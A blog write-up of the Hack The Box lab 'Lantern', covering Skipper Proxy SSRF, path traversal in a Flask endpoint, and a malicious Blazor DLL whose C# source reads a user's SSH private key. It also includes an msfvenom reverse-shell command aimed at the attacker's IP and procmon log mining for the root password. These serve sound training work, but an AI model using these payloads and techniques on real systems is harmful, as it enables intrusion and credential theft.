---
layout: post
title: "HTB: Lantern"
box: lantern
img: /img/lantern/lantern
author: Andrew Cherney
date: 2024-11-30
tags: htb hard-box season-6 linux webapp ssrf proxy dotnet directory-traversal dll lfi sqlite3 sudo blob
icon: "assets/icons/lantern.png"
post_description: "Starts off simple with 2 webapps to explore, one using a vulnerable version of Skipper Proxy. Through that proxy SSRF can be used to fuzz internal ports and find the running blazor application, which can further be used to find a DLL for the internal webapp. Once downloaded and decompiled a basic database can be found where a comment leaks a password for the admin portal. In that portal exists modules that run DLL files, and the function to upload with directory traversal to that module directory. With a proper DLL remote code can be run to find the SSH key. The final step involves exporting the sudo procmon and filtering through the BLOB entry within that database to find a command piping the root password into a backup script."
---

# Summary

{{ page.post_description }}

# Enumeration

For the initial enumeration I am using a script I cobbled together to handle the basics, it breaks sometimes and I am still tweaking it but one day It'll be copy-paste ready. You can find the [aptly named trash_enum.sh over here](https://github.com/CyberCherney/random_scripts/blob/main/hacking/automation/trash_enum.sh). Ironically this box didn't do much with webapp discovery or subdomains so the part of my script I specifically wanted to automate ended up not being used.

```bash
cat trash/results.trash 

# Nmap 7.92 scan initiated Fri Aug 23 13:34:56 2024 as: nmap -p22,80,3000 -sCV -oX trash/nmap/nmap_scan.xml -oN trash/nmap/nmap_scan_output.txt 10.10.11.29
Nmap scan report for 10.10.11.29
Host is up (0.083s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:c9:47:d5:89:f8:50:83:02:5e:fe:53:30:ac:2d:0e (ECDSA)
|_  256 d4:22:cf:fe:b1:00:cb:eb:6d:dc:b2:b4:64:6b:9d:89 (ED25519)
80/tcp   open  http    Skipper Proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Length: 207
|     Content-Type: text/html; charset=utf-8
|     Date: Fri, 23 Aug 2024 18:35:12 GMT
|     Server: Skipper Proxy
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Length: 225
|     Content-Type: text/html; charset=utf-8
|     Date: Fri, 23 Aug 2024 18:35:06 GMT
|     Location: http://lantern.htb/
|     Server: Skipper Proxy
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://lantern.htb/">http://lantern.htb/</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|     Content-Type: text/html; charset=utf-8
|     Date: Fri, 23 Aug 2024 18:35:06 GMT
|_    Server: Skipper Proxy
|_http-title: Did not follow redirect to http://lantern.htb/
|_http-server-header: Skipper Proxy
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 500 Internal Server Error
|     Connection: close
|     Content-Type: text/plain; charset=utf-8
|     Date: Fri, 23 Aug 2024 18:35:11 GMT
|     Server: Kestrel
|     System.UriFormatException: Invalid URI: The hostname could not be parsed.
|     System.Uri.CreateThis(String uri, Boolean dontEscape, UriKind uriKind, UriCreationOptions& creationOptions)
|     System.Uri..ctor(String uriString, UriKind uriKind)
|     Microsoft.AspNetCore.Components.NavigationManager.set_BaseUri(String value)
|     Microsoft.AspNetCore.Components.NavigationManager.Initialize(String baseUri, String uri)
|     Microsoft.AspNetCore.Components.Server.Circuits.RemoteNavigationManager.Initialize(String baseUri, String uri)
|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticComponentRenderer.<InitializeStandardComponentServicesAsync>g__InitializeCore|5_0(HttpContext httpContext)
|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticC
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Length: 0
|     Connection: close
|     Date: Fri, 23 Aug 2024 18:35:17 GMT
|     Server: Kestrel
|   Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|     Date: Fri, 23 Aug 2024 18:35:11 GMT
|     Server: Kestrel
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Content-Length: 0
|     Connection: close
|     Date: Fri, 23 Aug 2024 18:35:17 GMT
|     Server: Kestrel
|   SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|     Date: Fri, 23 Aug 2024 18:35:32 GMT
|_    Server: Kestrel
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.92%I=7%D=8/23%Time=66C8D657%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,18F,"HTTP/1\.0\x20302\x20Found\r\nContent-Length:\x20225\r\nCont
...
SF:r\nDate:\x20Fri,\x2023\x20Aug\x202024\x2018:35:32\x20GMT\r\nServer:\x20
SF:Kestrel\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two open webports, 80 and the uncommon 3000. My directory and subdomain scans yielded nothing so time for some manual enumeration.

## Port 80

{% include img_link src="/img/lantern/lantern_front_page" alt="front_page" ext="png" trunc=600 %}

{% include img_link src="/img/lantern/lantern_80_vacancies" alt="vacancies" ext="png" trunc=600 %}

Barren webapp here on port 80. The only interactable thing here is a resume upload. I throw some files at it and get the following result.

![Port 80 upload test]({{ page.img }}_80_PDF_only.png)

I try some XSS and other upload bypasses, notably a null byte let me upload a non pdf file but the location of that file I couldn't find (or it didn't properly upload it). I'll shelf this until I have nothing else.

## Port 3000

![blazor login]({{ page.img }}_3000_login.png)

An innocuous login portal was found on port 3000. I intercepted some traffic and found something I am unfamiliar with:

```
POST /_blazor?id=WvSYCIIItAsRKhG4fyAgZg HTTP/1.1
Host: lantern.htb:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://lantern.htb:3000/login
Content-Type: text/plain;charset=UTF-8
X-Requested-With: XMLHttpRequest
X-SignalR-User-Agent: Microsoft SignalR/0.0 (0.0.0-DEV_BUILD; Unknown OS; Browser; Unknown Runtime Version)
Origin: http://lantern.htb:3000
Content-Length: 975
DNT: 1
Connection: close

Í¡0¬StartCircuit¸http://lantern.htb:3000/½http://lantern.htb:3000/loginÚ[{"type":"server","sequence":0,"descriptor":"CfDJ8BUo1ePf0MxMocV2v0oTDZEUquJNkyDRzxlJfPonBJI/SMm+P11uHleduR+cYu9NBIS6vLBuNL7M1brYjZm0Lex87L4HfTZLAXWqdn/ngBCFrD6OKnsjkFhEAZRuIQe3rfKT2cDbVUcvDbVm1iDfZ6SZV4qEmb/EOoLTkJCJz2eOtFfoMrJWGdmSxzxXG3VToUJfCwyYDKeWXouBRnaIkHxCCbr5ZOKJBbf8Nn3s+nHYXnRR+8DPILXm8Rj+oyo2YfKdGSh5VhYQmmvyg+aJpHxCeLhB3Jq57qb4JarvRGNX6WVcI/CRBuLBJqUHtKfzYRMxnLUYQ489K8JNWy+u+i/j4CAPWIqNWQWCJszj7IkI"},{"type":"server","sequence":1,"descriptor":"CfDJ8BUo1ePf0MxMocV2v0oTDZHIFYnGWlxHVWZEdbwDAo7VQu6T2/VBw5u0sjWBqIq/qdlU0W0Q00jp3w1bM9iPyfectRGSSfbr/nbHJKBvLBLydI1+HuNa6i7fOmOSaCPiUOa+7ulpdmdGxn8lEju5tOxcIVt5Or7C5LsqFg029vBK822Qe2TAAIiPDWHQRYJBfq+XRgiTcFb2MLSZxJIqrxRnJV1eFmQFY6EkksMpp1IfUm52pEwfnA/7wn1PwrBXLaC9AjdqOfHQkYMKPT+XXzz9AqsbLrRPOO+IIKGM4k9TqbjhRMRiFo5OZX45wcToZ7Pzh7b8aZq1UIReLbo8T5me90w7HYgaHhQVNRzouHC7qcw4NqYDS9Ly9wjZR96Lptn0XzZ9L8x+Ehjx8ob9u+oevhoIrgv4N3FWPnEn2Mux"}] 
```

By the looks of the directory we are POSTing to, this is a .net blazor application. I dig around for some way to convert or change the data being sent and received, and I found [this blazor traffic processor burp extension](https://www.aon.com/cyber-solutions/aon_cyber_labs/new_burp_suite_extension_blazortrafficprocessor/). Each section of the json defines its length, so changing individual values is a futile effort. The extension allows the changing to json, the modifying of that json, then the reconverting back to the serialized data. 

But this is a tool for later, for now I need to find some way into an admin portal or a shell. This research will prove useful later, and if you take anything away from this writeup know that early research into tech or services will pay dividends in the long term during an engagement of any kind. Below you can see an example of how it looks.

![BTP deserialized json test]({{ page.img }}_deserialized_BTP.png)


```bash
whatweb -v http://lantern.htb:3000

WhatWeb report for http://lantern.htb:3000
Status    : 200 OK
Title     : <None>
IP        : 10.10.11.29
Country   : RESERVED, ZZ

Summary   : Bootstrap, HTML5, HTTPServer[Kestrel], Script

Detected Plugins:
[ Bootstrap ]
	Bootstrap is an open source toolkit for developing with 
	HTML, CSS, and JS. 

	Website     : https://getbootstrap.com/

[ HTML5 ]
	HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	String       : Kestrel (from server string)

[ Script ]
	This plugin detects instances of script HTML elements and 
	returns the script language/type. 


HTTP Headers:
	HTTP/1.1 200 OK
	Connection: close
	Content-Type: text/html; charset=utf-8
	Date: Sat, 24 Aug 2024 01:59:51 GMT
	Server: Kestrel
	Cache-Control: no-cache, no-store, max-age=0
	Transfer-Encoding: chunked
```

In running whatweb here I find that this is running a Kestrel server, more confirmation of this being an ASP.NET application. I decide to run whatweb on the webapp running on port 80.

```bash
whatweb -v http://lantern.htb

WhatWeb report for http://lantern.htb
Status    : 200 OK
Title     : Lantern
IP        : 10.10.11.29
Country   : RESERVED, ZZ

Summary   : HTML5, HTTPServer[Skipper Proxy], Meta-Author[Devcrud], Script

Detected Plugins:
[ HTML5 ]
	HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	String       : Skipper Proxy (from server string)

[ Meta-Author ]
	This plugin retrieves the author name from the meta name 
	tag - info: 
	http://www.webmarketingnow.com/tips/meta-tags-uncovered.html
	#author

	String       : Devcrud

[ Script ]
	This plugin detects instances of script HTML elements and 
	returns the script language/type. 


HTTP Headers:
	HTTP/1.1 200 OK
	Content-Length: 12049
	Content-Type: text/html; charset=utf-8
	Date: Sat, 24 Aug 2024 02:00:22 GMT
	Server: Skipper Proxy
	Connection: close
```

## Skippy Proxy SSRF

The HTTP server header is saying that it defines Skipper Proxy. I don't remember seeing this header when I looked initially but I will grab a packet and check again.

```
HTTP/1.1 404 Not Found
Content-Length: 207
Content-Type: text/html; charset=utf-8
Date: Sat, 24 Aug 2024 02:00:50 GMT
Server: Skipper Proxy
Connection: close
```

Must have missed that the first time around. Skipper according to [https://www.exploit-db.com/exploits/51111](https://www.exploit-db.com/exploits/51111) is vulnerable to SSRF. I'll grab the webapp on port 3000 as my poc to verify I can access internal resources through localhost.

![skipper proxy header poc]({{ page.img }}_skipper_header_poc.png)

A couple avenues open up now that we can access internal resources. First I can theoretically read files from both web applications, and second I can scan localhost for ports and interact with any backend services I find. I test with a port that should not be open to determine the negative result I want to filter out.

![Skipper Proxy SSRF port 69]({{ page.img }}_burp_negative_result.png)


Now onto the proper scanning. To prep I copy [https://github.com/HeckerBirb/top-nmap-ports-csv](https://github.com/HeckerBirb/top-nmap-ports-csv), place it into a file, then sed that file to format it:

```bash
nano top_nmap_ports
cat top_nmap_ports | sed 's/,/\n/g' > top_ports.txt
```

Copy that result and paste it into intruder.

### Port 5000

![Skipper Proxy SSRF port scan]({{ page.img }}_burp_intruder_port_5000.png)

```
GET / HTTP/1.1
Host: lantern.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
X-Skipper-Proxy: http://localhost:5000
Connection: close
Upgrade-Insecure-Requests: 1
```

```
HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 1669
Content-Type: text/html
Date: Sat, 24 Aug 2024 02:23:21 GMT
Etag: "1dae2bf21875e05"
Last-Modified: Tue, 30 Jul 2024 20:29:09 GMT
Server: Skipper Proxy
Connection: close

<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>InternaLantern</title>
    <base />
    <script type="text/javascript">
        (function (l) {
            if (l.search[1] === '/') {
                var decoded = l.search.slice(1).split('&').map(function (s) {
                    return s.replace(/~and~/g, '&')
                }).join('?');
                window.history.replaceState(null, null,
                    l.pathname.slice(0, -1) + decoded + l.hash
                );
            }
        }(window.location))
    </script>
    <script>
        var path = window.location.pathname.split('/');
        var base = document.getElementsByTagName('base')[0];
        if (window.location.host.includes('localhost')) {
            base.setAttribute('href', '/');
        } else if (path.length > 2) {
            base.setAttribute('href', '/' + path[1] + '/');
        } else if (path[path.length - 1].length != 0) {
            window.location.replace(window.location.origin + window.location.pathname + '/' + window.location.search);
        }
    </script>
    <link href="css/bootstrap/bootstrap.min.css" rel="stylesheet" />
    <link href="css/app.css" rel="stylesheet" />

</head>

<body>
    <div id="app">Loading...</div>

    <div id="blazor-error-ui">
        An unhandled error has occurred.
        <a href="" class="reload">Reload</a>
        <a class="dismiss">🗙</a>
    </div>

    <script src="_framework/blazor.webassembly.js"></script>
</body>

</html>
```

Well there's a file called **webassembly.js** and T try to read it.

![blazor webassembly js]({{ page.img }}_5000_webassembly_js_test.png)

I'll spare you the long file of mostly nothing, but inside of this file there is a reference to the **blazor.boot.json** file. 

![blazor boot json file leak]({{ page.img }}_5000_blazor_boot_leak.png)

Inside of that file is a load of dll's and associated hash values.

![blazor boot json]({{ page.img }}_5000_boot_json.png)

After sifting through the json you will eventually come across a reference to a dll named **InternaLantern.dll**. I need to download this file in a usable way so I use curl, but that brings me to another important tool that's needed here: a decompiler.

```
      "InternaLantern.dll": "sha256-pblWkC\/PhCCSxn1VOi3fajA0xS3mX\/\/RC0XvAE\/n5cI="
    },
    "extensions": null,
    "lazyAssembly": null,
    "libraryInitializers": null,
    "pdb": {
      "InternaLantern.pdb": "sha256-E8WICkNg65vorw8OEDOe6K9nJxL0QSt1S4SZoX5rTOY="
    },
```

```bash
curl -H "X-Skipper-Proxy: http://localhost:5000/" http://lantern.htb/_framework/InternaLantern.dll --output InternaLantern.dll


file InternaLantern.dll 

InternaLantern.dll: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

# User as tomas

### Decompiling DLLs

To work with this DLL I need a decompiler. For our use case with this box [https://decompiler.codemerx.com/](https://decompiler.codemerx.com/) should do the trick, although if at any point we need to edit and create our own DLLs a new tool will need to be used. Download from that link and run with `./CodemerxDecompile`

I ended up running through this whole DLL until I found some hard coded database credentials for initializing a database (I think). There is an internal info section of base64 encoded data. I ran through and decoded all of them till I found what I was looking for.

![InternaLantern dll ]({{ page.img }}_internalantern_dll_default_db.png)

```
John Smith
Head of sales department, emergency contact: +4412345678, email: john.s@example.com

Anny Turner
HR, emergency contact: +4412345678, email: anny.t@example.com

Catherine Rivas
FullStack developer, emergency contact: +4412345678, email: catherine.r@example.com

Lara Snyder
PR, emergency contact: +4412345678, email: lara.s@example.com

Lila Steele
Junior .NET developer, emergency contact: +4412345678, email: lila.s@example.com

Travis Duarte
System administrator, First day: 21/1/2024, Initial credentials admin:AJbFA_Q@925p9ap#22. Ask to change after first login!
```

## Lantern Admin

![blazor admin dashboard]({{ page.img }}_3000_admin_dashboard.png)

A quick look around yields we have access to look at logs, see the files within the app on port 80 (being run through flask), check uploaded pdfs, and use modules. There is a file upload module that peaks my interest.

![blazor file upload]({{ page.img }}_3000_admin_file_upload.png)

### Rabbit Hole 1

I threw some file uploads at the application, including php, asp, and python. None of them seemed to execute any code and none of them were restricted from uploading. Unlike PHP it seems .net might have some restrictions on running .asp files when visited.

![blazor admin shell upload]({{ page.img }}_3000_admin_shell_upload.png)

![blazor admin dashboard files]({{ page.img }}_3000_files.png)

### PrivacyAndPolicy LFI

The routes defined within app.py included a peculiar endpoint of /PrivacyAndPolicy.

```python
from flask import Flask, render_template, send_file, request, redirect, json
from werkzeug.utils import secure_filename
import os

app=Flask("__name__")

@app.route('/')
def index():
    if request.headers['Host'] != "lantern.htb":
        return redirect("http://lantern.htb/", code=302)
    return render_template("index.html")

@app.route('/vacancies')
def vacancies():
    return render_template('vacancies.html')

@app.route('/submit', methods=['POST'])
def save_vacancy():
    name = request.form.get('name')
    email = request.form.get('email')
    vacancy = request.form.get('vacancy', default='Middle Frontend Developer')

    if 'resume' in request.files:
        try:
            file = request.files['resume']
            resume_name = file.filename
            if resume_name.endswith('.pdf') or resume_name == '':
                filename = secure_filename(f"resume-{name}-{vacancy}-latern.pdf")
                upload_folder = os.path.join(os.getcwd(), 'uploads')
                destination = '/'.join([upload_folder, filename])
                file.save(destination)
            else:
                return "Only PDF files allowed!"
        except:
            return "Something went wrong!"
    return "Thank you! We will conact you very soon!"

@app.route('/PrivacyAndPolicy')
def sendPolicyAgreement():
    lang = request.args.get('lang')
    file_ext = request.args.get('ext')
    try:
            return send_file(f'/var/www/sites/localisation/{lang}.{file_ext}') 
    except: 
            return send_file(f'/var/www/sites/localisation/default/policy.pdf', 'application/pdf')

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8000)
```

The code directly places our inputs when looking for a file, supplied to the webapp through the parameters lang and ext. We can define lang and ext in a way to include that period between them in directory traversal. `http://lantern.htb/PrivacyAndPolicy?lang=../../../&ext=./etc/passwd` 

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
tomas:x:1000:1000:tomas:/home/tomas:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Here we can find the user name of tomas. Other than that this LFI is largely not useful for the upcoming exploit. 

### Malicious dll

Within the module selector it is possible to define a custom module. The modules afforded to us are FileUpload, FileTree, Logs, HealthCheck, and Resumes. When attempting to run **module** as a module the response leaks the backend code is checking for `/opt/components/module.dll` and turning back to FileUpload I decide to check for directory traversal within the filename parameter.

![BTP directory traversal]({{ page.img }}_burp_BTP_serialized_directory.png)

I did this test twice and got results the second time, pretend the above says *raccoon.dll* instead of *test.dll*. Intercept the upload request and deserialize the data, change it to include the directory traversal, then reserialize and send. 

![blazor raccoon module test]({{ page.img }}_3000_raccoon_dll_upload.png)

![blazor admin module check]({{ page.img }}_3000_module_check.png)

So 2 things are at play here, there is an auto cleaning script which gives me a small window to run the dll, and I need to actually make a malicious dll. 

I first try to make a shell with msfvenom.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=7777 -f dll > racc_shell.dll
```

```
POST /_blazor?id=XGXAr_D4CqyM1O-9vy4kYw HTTP/1.1
Host: lantern.htb:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://lantern.htb:3000/
Content-Type: text/plain;charset=UTF-8
X-Requested-With: XMLHttpRequest
X-SignalR-User-Agent: Microsoft SignalR/0.0 (0.0.0-DEV_BUILD; Unknown OS; Browser; Unknown Runtime Version)
Origin: http://lantern.htb:3000
Content-Length: 194
DNT: 1
Connection: close

êÀ·BeginInvokeDotNetFromJS¡2À¬NotifyChangeÙº[[{"blob":{},"size":9216,"name":"../../../../../../../../../opt/components/racc_shell.dll","id":1,"lastModified":"2024-08-24T04:24:12.616Z","contentType":"application/x-msdos-program"}]]
```

Same error as an empty file: bad IL format. I try another way at making my own dll from scratch before deciding it's better to shell out *FileUpload.dll*. I then need try to read tomas' key. Some of this was added with the assistance of Senior Dev GPT, and namely the builder and render parts got very upset in my testing if I ever modified or changed them. 

```bash
using Microsoft.AspNetCore.Components;
using Microsoft.AspNetCore.Components.CompilerServices;
using Microsoft.AspNetCore.Components.Forms;
using Microsoft.AspNetCore.Components.Rendering;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.ExceptionServices;
using System.Threading;
using System.Threading.Tasks;

namespace takethree
{
	public class Component : ComponentBase
	{
		protected override void BuildRenderTree(RenderTreeBuilder builder)
		{
			base.BuildRenderTree(builder);
			string file = File.ReadAllText("/home/tomas/.ssh/id_rsa");
			builder.AddContent(0, file);
		}
	}

}
```

To compile this I needed to install dotnet-sdk and create a new classlib, then change the csproj file to specify `<TargetFramework>net6.0</TargetFramework>`, and I then add the required packages specifying the 6.0.0 version as well. 

```bash
sudo snap install dotnet-sdk --classic
sudo ln -s /snap/dotnet-sdk/current/dotnet /usr/local/bin/dotnet
dotnet --version
8.0.400
dotnet new classlib -n takethree
cd takethree
cp ../takethree.cs Class1.cs 
nano takethree.csproj
dotnet add package Microsoft.AspNetCore.Components --version 6.0.0
dotnet add package Microsoft.AspNetCore.Components.Web --version 6.0.0
dotnet build -c Release
```

Then upload by intercepting the request and changing the name. And after a successful upload run the module.

![lfi id_rsa]({{ page.img }}_3000_id_rsa_takethree.png)

```bash
ssh tomas@lantern.htb -i lantern_rsa

tomas@lantern:~$ id
uid=1000(tomas) gid=1000(tomas) groups=1000(tomas)
tomas@lantern:~$ ls
LanternAdmin  user.txt
tomas@lantern:~$ cat user.txt 
c9b04b4a32bd--------------------
```

# Root

## nano in procmon

```bash
tomas@lantern:~$ sudo -l
Matching Defaults entries for tomas on lantern:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tomas may run the following commands on lantern:
    (ALL : ALL) NOPASSWD: /usr/bin/procmon
```

Procmon functions similar to top where it is a metric tracker for processes. The processes however can only be useful if they might inputs that aren't entered as an argument to a command. I can select a specific process to track and export the logs. And I might have unintentionally found one of those processes that could be useful.

```
root       17742  0.0  0.1   7272  4092 pts/0    Ss+  05:20   0:00 nano /root/automation.sh
```

I can track this exact process with the p flag. 

```bash
sudo /usr/share/procmon -p 17742
```

Here I had some problems of not letting procmon run for long enough. I waited until 6900 where it stopped incrementing. Then I used F6 to export and hosted a python webserver to grab the db file.

```sql
sqlite3 procmon_2024-08-24_06\:17\:41.db

sqlite> PRAGMA table_info(ebpf)
   ...> ;
0|pid|INT|0||0
1|stacktrace|TEXT|0||0
2|comm|TEXT|0||0
3|processname|TEXT|0||0
4|resultcode|INTEGER|0||0
5|timestamp|INTEGER|0||0
6|syscall|TEXT|0||0
7|duration|INTEGER|0||0
8|arguments|BLOB|0||0
sqlite> PRAGMA table_info(ebpf);
0|pid|INT|0||0
1|stacktrace|TEXT|0||0
2|comm|TEXT|0||0
3|processname|TEXT|0||0
4|resultcode|INTEGER|0||0
5|timestamp|INTEGER|0||0
6|syscall|TEXT|0||0
7|duration|INTEGER|0||0
8|arguments|BLOB|0||0
sqlite> PRAGMA table_info(metadata);
0|startTime|INT|0||0
1|startEpocTime|TEXT|0||0
sqlite> PRAGMA table_info(stats);
0|syscall|TEXT|0||0
1|count|INTEGER|0||0
2|duration|INTEGER|0||0
```

The table we care about here is the output from the processes themselves, so ebpf is where we will start filtering. 

```sql
sqlite> select * from ebpf;
148257|140563199432674$/usr/lib/x86_64-linux-gnu/libc.so.6!read|sshd|sshd|107|42513918113538|read|5831|

148257|140563199266891$/usr/lib/x86_64-linux-gnu/libc.so.6!__getpid|sshd|sshd|148257|42513918135519|getpid|3446|

148257|140563198938139$/usr/lib/x86_64-linux-gnu/libc.so.6!pthread_sigmask|sshd|sshd|0|42513918152671|rt_sigprocmask|3607|
148257|140563199450223$/usr/lib/x86_64-linux-gnu/libc.so.6!ppoll|sshd|sshd|1|42513918162570|ppoll|5590|�?]UvU
148257|140563198938139$/usr/lib/x86_64-linux-gnu/libc.so.6!pthread_sigmask|sshd|sshd|0|42513918173751|rt_sigprocmask|3256|
148257|140563199432839$/usr/lib/x86_64-linux-gnu/libc.so.6!__write;0$[UNKNOWN]|sshd|sshd|148|42513918183249|write|30777|
148257|140563198938139$/usr/lib/x86_64-linux-gnu/libc.so.6!pthread_sigmask|sshd|sshd|0|42513918221851|rt_sigprocmask|3647|
148533|140314342327795$/usr/lib/x86_64-linux-gnu/libc.so.6!__libc_sigaction|sudo|sudo|0|42513918353949|rt_sigaction|5109|
148533|140314343205999$/usr/lib/x86_64-linux-gnu/libc.so.6!ppoll|sudo|sudo|1|42513918370029|ppoll|403927| �-��U
```

The arguments column is spitting out inconsistent and odd results. Looking back at the table schema we can see it is a BLOB object, a binary large object. If I want to read this output I'll need to convert it to hex. Additionally the resultcode column makes me wonder if -1 is an error, 0 is a failed result, and 1 is a success. I'll filter for >0 and see what I get.

I need to determine what kind of data can be found in arguments so here I will be encoding to hex then decoding and removing null bytes in CyberChef.

```sql
sqlite> select hex(arguments) from ebpf order by timestamp limit 1;
01000000000000001B5B3F32356C1B28426563686F3443284220526500060000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
sqlite> select * from ebpf order by timestamp limit 1;
18076|140123590453383$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|6|100000428822012|write|16722|

CYBERCHEF:
[?25l(Becho4C(B Re
```

There is an ANSI escape code in the arguments for this entry, useful for outputting to terminals. The result code of this entry is 6, much greater than 1. It is possible the resultcode positive integers correspond to how many bytes were output. On that same vein the first 9 bytes are always the same and I can start the substr() from 9 instead of 0. 

```sql
sqlite> select hex(substr(arguments,9)) from ebpf where resultcode > 0 order by timestamp limit 3;
1B5B3F32356C1B28426563686F3443284220526500060000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
1B5B3F3235681B28426563686F3443284220526500060000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
685B3F3235681B28426563686F34432842205265000100000000000000302B2F6CF75500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
sqlite> select * from ebpf where resultcode > 0 order by timestamp limit 3;
18076|140123590453383$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|6|100000428822012|write|16722|
18076|140123590453383$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|6|100000432164411|write|12363|
18076|140123590453383$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|1|100000432733829|write|8847|

CYBERCHEF:
[?25l(Becho4C(B Re[?25h(Becho4C(B Reh[?25h(Becho4C(B Re0+/l÷U
```

If I assume the resultcode is the bytes written, that means a resultcode of 6 on these queries corresponds to `[?25l` and 1 corresponds to `h`. I then filter the above hex from cyberchef then cat the download.dat output it spits out an *h* as expected. 



```bash
cat download.dat 

h
```

I'll now filter the length of the queries by the resultcode and see what it gives me. This time I'll output it to a file to import into cyberchef.

```sql
sqlite> .output filtered_test
sqlite> select hex(substr(arguments,9,resultcode)) from ebpf where resultcode > 0 order by timestamp;
sqlite> .output
sqlite> .quit
```

```bash
cat download.dat

e
e
e
echo Q 33EEddddttddww33ppM
```

Well this looks incomplete. I strings the file and see some data was not rendered to the terminal. 

```bash
strings download.dat 
[?25l
[?25hww
[?25l
[?25h33
[?25l
[?25hpp
[?25l
[?25hMM
[?25l
[?25hBB
[?25l
[?25h 
[?25l
[?25h
[?25l
[?25h 
[?25l
[?25h
[?25l
[?25huu
[?25l
[?25hdd
[?25l
[?25hoo
[?25l
[?25h 
[?25l
[?25h
[?25l
[?25h//
[?25l
[?25hbb
[?25l
[?25haa
[?25l
[?25hcc
[?25l
...
```

Characters are here that I was not seeing in the terminal. Manually going through the contents are `echo 3Eddtdw3pMB   udo  / backupsh`, when running sudo you can pipe the password into the sudo command instead of typing in the password. I know there was a Q at the beginning, so the final password is **Q3Eddtdw3pMB**. 

```bash
tomas@lantern:~$ su root
Password: 
root@lantern:/home/tomas# cat /root/root.txt
75a4c577616c52------------------
```
